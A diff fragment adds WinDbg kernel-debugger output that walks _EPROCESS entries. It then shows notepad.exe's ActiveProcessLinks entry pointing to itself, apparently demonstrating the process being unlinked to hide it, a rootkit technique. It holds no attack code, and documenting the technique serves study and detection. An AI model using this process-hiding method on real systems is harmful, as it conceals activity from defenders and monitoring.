+   +0x440 UniqueProcessId : 0x00000000`0000022c Void
+   +0x5a8 ImageFileName   : [15]  "wininit.exe"
+nt!_EPROCESS
+   +0x440 UniqueProcessId : 0x00000000`00000254 Void
+   +0x5a8 ImageFileName   : [15]  "winlogon.exe"
+nt!_EPROCESS
+   +0x440 UniqueProcessId : 0x00000000`000002b4 Void
+   +0x5a8 ImageFileName   : [15]  "lsass.exe"
+nt!_EPROCESS
+   +0x440 UniqueProcessId : 0x00000000`00000d68 Void
+   +0x5a8 ImageFileName   : [15]  "notepad.exe"
+......
+
+0: kd> !process d68 0
+Searching for Process with Cid == d68
+PROCESS ffffe089828f6240
+    SessionId: 1  Cid: 0d68    Peb: 411f92b000  ParentCid: 0e88
+    DirBase: 4eeb8002  ObjectTable: ffff9706f4ecdb40  HandleCount: 271.
+    Image: notepad.exe
+
+0: kd> dx -id 0,0,ffffe08985717080 -r1 (*((ntkrnlmp!_LIST_ENTRY *)0xffffe089828f6688))
+(*((ntkrnlmp!_LIST_ENTRY *)0xffffe089828f6688))                 [Type: _LIST_ENTRY]
+    [+0x000] Flink            : 0xffffe089828f6688 [Type: _LIST_ENTRY *]
+    [+0x008] Blink            : 0xffffe089828f6688 [Type: _LIST_ENTRY *]
+```
